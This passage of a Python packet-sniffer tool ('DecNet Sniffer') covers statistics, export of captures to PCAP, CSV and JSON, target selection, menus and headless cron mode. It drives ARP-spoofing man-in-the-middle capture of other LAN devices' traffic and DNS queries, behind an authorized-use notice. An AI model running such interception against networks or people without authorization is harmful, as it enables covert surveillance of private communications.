    kwargs = {"iface": STATE.interface, "prn": analyze_packet, "store": 0,
              "filter": target_filter}
    if packet_count > 0:
        kwargs["count"] = packet_count
    if duration > 0:
        kwargs["timeout"] = duration

    try:
        _run_async_capture(kwargs)
    finally:
        print()
        stop_arp_spoofing()
        msg_ok(f"Capture stopped. {STATE.packets_captured} packets captured.")


# ═══════════════════════════════════════════════════════════════════
#  STATISTICS & REPORTING
# ═══════════════════════════════════════════════════════════════════
def show_stats():
    """Display capture statistics."""
    divider("CAPTURE STATISTICS")

    elapsed = "N/A"
    rate = "N/A"
    if STATE.capture_start:
        delta = datetime.now() - STATE.capture_start
        elapsed = str(delta).split('.')[0]
        secs = max(delta.total_seconds(), 0.001)
        rate = f"{STATE.packets_captured / secs:.1f} pkt/s"

    print(f"""
  {C.BOLD}Total Packets:{C.RESET}  {STATE.packets_captured}
  {C.BOLD}Duration:{C.RESET}       {elapsed}
  {C.BOLD}Avg Rate:{C.RESET}       {rate}
  {C.BOLD}Interface:{C.RESET}      {STATE.interface}
  {C.BOLD}Target:{C.RESET}         {STATE.target_ip or 'Local (self)'}
""")

    if STATE.protocol_stats:
        print(f"  {C.BOLD}Protocol Breakdown:{C.RESET}")
        total = sum(STATE.protocol_stats.values())
        for proto, count in STATE.protocol_stats.most_common(15):
            pct = (count / total) * 100
            bar_len = int(pct / 2)
            bar = f"{'█' * bar_len}{'░' * (50 - bar_len)}"
            print(f"    {proto:<12} {C.CYAN}{bar}{C.RESET} {count:>6} ({pct:.1f}%)")
        print()

    if STATE.port_stats:
        print(f"  {C.BOLD}Top 10 Destination Ports:{C.RESET}")
        for port, count in STATE.port_stats.most_common(10):
            try:
                svc = socket.getservbyport(port)
            except OSError:
                svc = "unknown"
            print(f"    Port {C.CYAN}{port:<6}{C.RESET} ({svc:<12}) → {count} packets")
        print()

    if STATE.connections:
        print(f"  {C.BOLD}Top 10 Connections (by packet count):{C.RESET}")
        sorted_conns = sorted(STATE.connections.items(),
                              key=lambda x: x[1]["count"], reverse=True)[:10]
        for conn, data in sorted_conns:
            size_kb = data["bytes"] / 1024
            print(f"    {conn:<40} {data['count']:>6} pkts  {size_kb:>8.1f} KB")
        print()

    if STATE.dns_queries:
        print(f"  {C.BOLD}DNS Queries ({len(STATE.dns_queries)} total):{C.RESET}")
        query_counts = Counter(q['query'] for q in STATE.dns_queries)
        for domain, count in query_counts.most_common(20):
            print(f"    {C.MAGENTA}{domain:<45}{C.RESET} ({count}x)")
        print()


def export_data():
    """Export captured data to files (PCAP + CSV + JSON)."""
    divider("DATA EXPORT")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_dir = os.path.expanduser("~/decnet_captures")
    os.makedirs(base_dir, exist_ok=True)

    if STATE.captured_packets:
        pcap_file = os.path.join(base_dir, f"capture_{timestamp}.pcap")
        try:
            wrpcap(pcap_file, STATE.captured_packets)
            msg_ok(f"PCAP saved: {pcap_file}")
        except Exception as e:
            msg_err(f"PCAP export failed: {e}")

    if STATE.dns_queries:
        dns_file = os.path.join(base_dir, f"dns_queries_{timestamp}.csv")
        try:
            with open(dns_file, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=["time", "src", "query", "type"])
                writer.writeheader()
                writer.writerows(STATE.dns_queries)
            msg_ok(f"DNS log saved: {dns_file}")
        except OSError as e:
            msg_err(f"DNS export failed: {e}")

    stats_file = os.path.join(base_dir, f"stats_{timestamp}.json")
    try:
        payload = {
            "capture_info": {
                "tool_version": VERSION,
                "timestamp": timestamp,
                "interface": STATE.interface,
                "target": STATE.target_ip or "local",
                "my_ip": STATE.my_ip,
                "gateway": STATE.gateway_ip,
                "packets_captured": STATE.packets_captured,
                "duration": str(datetime.now() - STATE.capture_start) if STATE.capture_start else "N/A",
            },
            "protocol_stats": dict(STATE.protocol_stats),
            "port_stats": {str(k): v for k, v in STATE.port_stats.most_common(50)},
            "top_connections": {
                k: v for k, v in sorted(
                    STATE.connections.items(),
                    key=lambda x: x[1]["count"], reverse=True,
                )[:50]
            },
            "dns_queries": STATE.dns_queries,
            "devices_on_network": STATE.devices,
        }
        with open(stats_file, 'w') as f:
            json.dump(payload, f, indent=2, default=str)
        msg_ok(f"Stats saved: {stats_file}")
    except OSError as e:
        msg_err(f"Stats export failed: {e}")

    print()
    msg_ok(f"All exports saved to: {base_dir}")


# ═══════════════════════════════════════════════════════════════════
#  TARGET SELECTION
# ═══════════════════════════════════════════════════════════════════
def resolve_mac_for_ip(ip):
    """Resolve MAC for an IP via ARP request, OS cache, then ping+recheck."""
    msg_info(f"Sending ARP request to {ip}...")
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=3, verbose=0, iface=STATE.interface, retry=2)
        if ans:
            mac = ans[0][1].hwsrc
            msg_ok(f"ARP resolved: {ip} → {mac}")
            return mac
    except Exception as e:
        msg_warn(f"ARP request failed: {e}")

    msg_info("Checking local ARP cache...")
    try:
        result = subprocess.run(["arp", "-n", ip], capture_output=True, text=True, timeout=5)
        for line in result.stdout.splitlines():
            if ip in line:
                for part in line.split():
                    if ":" in part and len(part) == 17:
                        msg_ok(f"Found in ARP cache: {ip} → {part}")
                        return part
    except (OSError, subprocess.SubprocessError):
        pass

    msg_info(f"Pinging {ip} to wake device...")
    try:
        subprocess.run(["ping", "-c", "3", "-W", "1", ip], capture_output=True, timeout=10)
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=3, verbose=0, iface=STATE.interface)
        if ans:
            mac = ans[0][1].hwsrc
            msg_ok(f"ARP resolved after ping: {ip} → {mac}")
            return mac
    except (OSError, subprocess.SubprocessError):
        pass

    return None


def validate_ip(ip_str):
    """Validate an IPv4 address string."""
    try:
        parts = ip_str.strip().split(".")
        if len(parts) != 4:
            return False
        return all(0 <= int(p) <= 255 for p in parts)
    except (ValueError, AttributeError):
        return False


def set_target_with_validation(ip, mac):
    """Set the target IP/MAC with safety checks."""
    if ip == STATE.gateway_ip:
        msg_warn(f"⚠  {ip} is your GATEWAY — not a client device!")
        msg_warn("ARP spoofing the gateway against itself won't capture useful traffic.")
        msg_info("You should target a CLIENT device (phone, TV, laptop, etc.)")
        print()
        try:
            confirm = input(f"  {C.YELLOW}Are you sure you want to target the gateway? (yes/no): {C.RESET}").strip().lower()
        except (KeyboardInterrupt, EOFError):
            print()
            return False
        if confirm not in ("yes", "y"):
            msg_info("Cancelled. Select a different target.")
            return False

    if ip == STATE.my_ip:
        msg_warn("That's your own IP address. Use 'Sniff Local Traffic' (option 3) instead.")
        return False

    STATE.target_ip = ip
    STATE.target_mac = mac
    msg_ok(f"Target set: {STATE.target_ip} ({STATE.target_mac})")
    return True


def select_target():
    """Select a target device — pick from list OR type an IP directly."""
    divider("TARGET SELECTION")
    has_devices = len(STATE.devices) > 0

    if has_devices:
        print()
        print(f"  {C.BOLD}{'#':<4} {'IP Address':<18} {'MAC Address':<20} {'Vendor':<16} {'Note'}{C.RESET}")
        print(f"  {C.DIM}{'─' * 75}{C.RESET}")
        for i, dev in enumerate(STATE.devices, 1):
            note = ""
            if dev['ip'] == STATE.gateway_ip:
                note = f"{C.GREEN}[GATEWAY]{C.RESET}"
            elif dev['ip'] == STATE.my_ip:
                note = f"{C.BLUE}[YOU]{C.RESET}"
            vendor = dev['vendor'][:14]
            print(f"  {C.CYAN}{i:<4}{C.RESET} {dev['ip']:<18} {dev['mac']:<20} {vendor:<16} {note}")
        print(f"  {C.DIM}{'─' * 75}{C.RESET}")
        print()
        print(f"  {C.BOLD}Enter a number{C.RESET} to pick a device from the list above")
        print(f"  {C.BOLD}  — OR —{C.RESET}")
        print(f"  {C.BOLD}Type an IP address{C.RESET} directly (e.g. {C.CYAN}192.168.1.50{C.RESET}) to target any device")
        print()
    else:
        print()
        msg_info("No devices have been scanned yet.")
        msg_info("You can run a scan first (option 1) or just type an IP address now.")
        print()
        print(f"  {C.BOLD}Type an IP address{C.RESET} to target a device (e.g. {C.CYAN}192.168.1.50{C.RESET})")
        if STATE.my_ip:
            print(f"  Your subnet: {C.CYAN}{'.'.join(STATE.my_ip.split('.')[:3])}.x{C.RESET}")
        print()

    try:
        choice = input(f"  {C.YELLOW}Device # or IP address (or 'back'): {C.RESET}").strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return

    if choice.lower() == 'back' or choice == '':
        return

    if choice.isdigit() and has_devices:
        idx = int(choice) - 1
        if 0 <= idx < len(STATE.devices):
            dev = STATE.devices[idx]
            set_target_with_validation(dev['ip'], dev['mac'])
        else:
            msg_err(f"Invalid device number. Expected 1-{len(STATE.devices)}.")
        return

    if validate_ip(choice):
        ip = choice
        msg_info(f"Manual target: {ip}")
        known_mac = None
        for dev in STATE.devices:
            if dev['ip'] == ip:
                known_mac = dev['mac']
                msg_ok(f"Found in previous scan: {ip} → {known_mac}")
                break
        if not known_mac:
            known_mac = resolve_mac_for_ip(ip)

        if known_mac:
            set_target_with_validation(ip, known_mac)
        else:
            msg_warn(f"Could not resolve MAC address for {ip}")
            msg_info("The device may be offline, sleeping, or blocking ARP.")
            print()
            print(f"  {C.CYAN}1{C.RESET} │ Enter the MAC address manually")
            print(f"  {C.CYAN}2{C.RESET} │ Cancel")
            print()
            msg_info("Tip: find the MAC in your router's admin page (DHCP client list)")
            msg_info("or on the device itself (Settings → About → Status).")
            print()
            try:
                fallback = input(f"  {C.YELLOW}Choose [1/2]: {C.RESET}").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                return
            if fallback == "1":
                try:
                    mac = input(f"  {C.YELLOW}MAC address (format aa:bb:cc:dd:ee:ff): {C.RESET}").strip().lower()
                except (KeyboardInterrupt, EOFError):
                    print()
                    return
                if len(mac) == 17 and mac.count(":") == 5:
                    set_target_with_validation(ip, mac)
                else:
                    msg_err("Invalid MAC format. Expected: aa:bb:cc:dd:ee:ff")
            else:
                msg_info("Cancelled.")
    else:
        msg_err(f"'{choice}' is not a valid device number or IP address.")
        msg_info("Enter a number from the list, or a full IP like 192.168.1.50")


def configure_capture():
    """Configure capture parameters interactively."""
    divider("CAPTURE CONFIGURATION")
    print()

    duration = 0
    packet_count = 0
    bpf_filter = ""
    verbose = True

    print(f"  {C.BOLD}Configure capture parameters (press Enter for defaults):{C.RESET}")
    print()

    try:
        d = input(f"  {C.YELLOW}Capture duration in seconds (0 = unlimited): {C.RESET}").strip()
        if d.isdigit():
            duration = int(d)

        p = input(f"  {C.YELLOW}Max packet count (0 = unlimited): {C.RESET}").strip()
        if p.isdigit():
            packet_count = int(p)

        print(f"\n  {C.BOLD}BPF Filter Examples:{C.RESET}")
        print(f"    {C.DIM}tcp port 80{C.RESET}          → HTTP traffic only")
        print(f"    {C.DIM}tcp port 443{C.RESET}         → HTTPS traffic only")
        print(f"    {C.DIM}udp port 53{C.RESET}          → DNS queries only")
        print(f"    {C.DIM}tcp port 22{C.RESET}          → SSH traffic")
        print(f"    {C.DIM}icmp{C.RESET}                 → Ping/traceroute only")
        print(f"    {C.DIM}not port 443{C.RESET}         → Exclude HTTPS")
        print(f"    {C.DIM}host 192.168.1.50{C.RESET}    → Specific host")
        print()
        bpf_filter = input(f"  {C.YELLOW}BPF Filter (blank = capture all): {C.RESET}").strip()

        v = input(f"  {C.YELLOW}Verbose output - show each packet? (Y/n): {C.RESET}").strip().lower()
    except (KeyboardInterrupt, EOFError):
        print()
        return 0, 0, ""

    if v == 'n':
        verbose = False
        msg_info("Quiet mode — only alerts and stats will be shown")

    STATE.verbose = verbose
    return duration, packet_count, bpf_filter


def reset_state():
    """Reset capture state for a new session."""
    STATE.packets_captured = 0
    STATE.capture_start = None
    STATE.captured_packets = []
    STATE.dns_queries = []
    STATE.connections = defaultdict(
        lambda: {"count": 0, "bytes": 0, "first_seen": None, "last_seen": None}
    )
    STATE.protocol_stats = Counter()
    STATE.port_stats = Counter()
    STATE.max_store_warned = False
    msg_ok("Capture state reset")


# ═══════════════════════════════════════════════════════════════════
#  MAIN MENU
# ═══════════════════════════════════════════════════════════════════
def main_menu():
    """Main interactive menu."""
    while True:
        print()
        divider("MAIN MENU")
        print(f"""
  {C.CYAN}1{C.RESET} │ Scan Network           {C.DIM}Discover all devices on the LAN{C.RESET}
  {C.CYAN}2{C.RESET} │ Select Target Device    {C.DIM}Choose from scan or enter IP manually{C.RESET}
  {C.CYAN}3{C.RESET} │ Sniff Local Traffic     {C.DIM}Capture packets on this machine{C.RESET}
  {C.CYAN}4{C.RESET} │ Sniff Target Traffic    {C.DIM}Capture target's packets via ARP spoof{C.RESET}
  {C.CYAN}5{C.RESET} │ View Statistics         {C.DIM}Protocol breakdown, DNS queries, etc.{C.RESET}
  {C.CYAN}6{C.RESET} │ Export Data             {C.DIM}Save PCAP, CSV, and JSON reports{C.RESET}
  {C.CYAN}7{C.RESET} │ Reset Capture           {C.DIM}Clear all captured data{C.RESET}
  {C.CYAN}0{C.RESET} │ Exit                    {C.DIM}Clean up and quit{C.RESET}
""")
        target_str = f"{STATE.target_ip} ({STATE.target_mac})" if STATE.target_ip else "None"
        print(f"  {C.DIM}Current Target: {C.RESET}{target_str}")
        print(f"  {C.DIM}Packets Captured: {C.RESET}{STATE.packets_captured}")
        print()

        try:
            choice = input(f"  {C.YELLOW}Select option [0-7]: {C.RESET}").strip()
            if choice == "1":
                discover_network()
            elif choice == "2":
                select_target()
            elif choice == "3":
                duration, count, bpf = configure_capture()
                capture_own_traffic(duration, count, bpf)
            elif choice == "4":
                if not STATE.target_ip:
                    msg_warn("No target selected. Please select a target first.")
                    select_target()
                if STATE.target_ip:
                    duration, count, bpf = configure_capture()
                    capture_target_traffic(duration, count, bpf)
            elif choice == "5":
                show_stats()
            elif choice == "6":
                export_data()
            elif choice == "7":
                reset_state()
            elif choice == "0":
                cleanup_and_exit()
            else:
                msg_err("Invalid option. Please select 0-7.")
        except (KeyboardInterrupt, EOFError):
            print()
            cleanup_and_exit()


# ═══════════════════════════════════════════════════════════════════
#  SIGNAL HANDLING & CLEANUP
# ═══════════════════════════════════════════════════════════════════
def cleanup_and_exit():
    """Clean up and exit gracefully."""
    divider("SHUTTING DOWN")

    if STATE.arp_spoofing:
        stop_arp_spoofing()

    if STATE.packets_captured > 0:
        try:
            save = input(f"\n  {C.YELLOW}Save captured data before exiting? (y/N): {C.RESET}").strip().lower()
        except (KeyboardInterrupt, EOFError):
            save = ""
        if save in ('y', 'yes'):
            export_data()

    print()
    msg_ok("DecNet Sniffer shut down cleanly. Stay safe out there.")
    print()
    sys.exit(0)


def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully."""
    if STATE.running:
        # A capture is active: just ask it to stop; the poll loop picks this up.
        STATE.running = False
    else:
        print()
        cleanup_and_exit()


# ═══════════════════════════════════════════════════════════════════
#  HEADLESS MODE
# ═══════════════════════════════════════════════════════════════════
def run_headless(args):
    """Non-interactive capture path for cron/systemd."""
    STATE.verbose = not args.quiet

    check_root()
    detect_interfaces(preferred=args.iface)
    detect_gateway()

    if args.scan or args.target:
        discover_network()

    if args.target:
        if not validate_ip(args.target):
            msg_err(f"Invalid --target IP: {args.target}")
            sys.exit(2)
        mac = None
        for dev in STATE.devices:
            if dev['ip'] == args.target:
                mac = dev['mac']
                break
        if not mac:
            mac = resolve_mac_for_ip(args.target)
        if not mac or not set_target_with_validation(args.target, mac):
            msg_err("Could not establish target for MITM capture.")
            sys.exit(2)
        capture_target_traffic(args.duration, args.count, args.filter or "")
    else:
        capture_own_traffic(args.duration, args.count, args.filter or "")

    show_stats()
    if args.export:
        export_data()
    cleanup_and_exit()


# ═══════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════
def parse_args():
    p = argparse.ArgumentParser(
        prog="decnet_sniffer.py",
        description=f"DecNet Packet Sniffer v{VERSION} (DECINT Tools). "
                    "Authorized-network use only.",
    )
    p.add_argument("--iface", help="Interface to use (skips interactive selection)")
    p.add_argument("--duration", type=int, default=0, metavar="SEC",
                   help="Capture duration in seconds (0 = unlimited)")
    p.add_argument("--count", type=int, default=0, metavar="N",
                   help="Max packets to capture (0 = unlimited)")
    p.add_argument("--filter", default="", metavar="BPF",
                   help="BPF capture filter, e.g. 'tcp port 80'")
    p.add_argument("--target", metavar="IP",
                   help="Target device IP for ARP-MITM capture (own network only)")
    p.add_argument("--scan", action="store_true",
                   help="Run an ARP device-discovery scan")
    p.add_argument("--export", action="store_true",
                   help="Export PCAP/CSV/JSON automatically after capture")
    p.add_argument("--quiet", action="store_true",
                   help="Suppress per-packet output (stats/alerts only)")
    p.add_argument("--no-menu", action="store_true",
                   help="Run headless (implied when --duration/--count/--target given)")
    p.add_argument("--version", action="version",
                   version=f"DecNet Sniffer v{VERSION}")
    return p.parse_args()


def main():
    """Main entry point."""
    args = parse_args()
    signal.signal(signal.SIGINT, signal_handler)

    headless = args.no_menu or args.target or args.duration or args.count
    if headless:
        banner()
        divider("HEADLESS MODE")
        run_headless(args)
        return

    clear_screen()
    banner()

    divider("STARTUP SEQUENCE")
    print()

    msg_info("Step 1/4: Checking privileges...")
    check_root()

    msg_info("Step 2/4: Detecting network interfaces...")
    detect_interfaces(preferred=args.iface)

    msg_info("Step 3/4: Detecting gateway...")
    detect_gateway()

    msg_info("Step 4/4: Discovering network devices...")
    print()

    try:
        scan_now = input(f"  {C.YELLOW}Scan network for devices now? (Y/n): {C.RESET}").strip().lower()
    except (KeyboardInterrupt, EOFError):
        print()
        cleanup_and_exit()
    if scan_now != 'n':
        discover_network()

    msg_ok("Startup complete! Ready to capture.")

    print(f"""
  {C.DIM}{'─' * 57}{C.RESET}
  {C.YELLOW}{C.BOLD}⚠  LEGAL NOTICE{C.RESET}
  {C.DIM}This tool is for authorized network security testing only.
  Unauthorized interception of network traffic is illegal.
  Only use on networks you own or have written permission
  to test. You are responsible for complying with all
  applicable laws in your jurisdiction.{C.RESET}
  {C.DIM}{'─' * 57}{C.RESET}
""")

    main_menu()


if __name__ == "__main__":
    main()
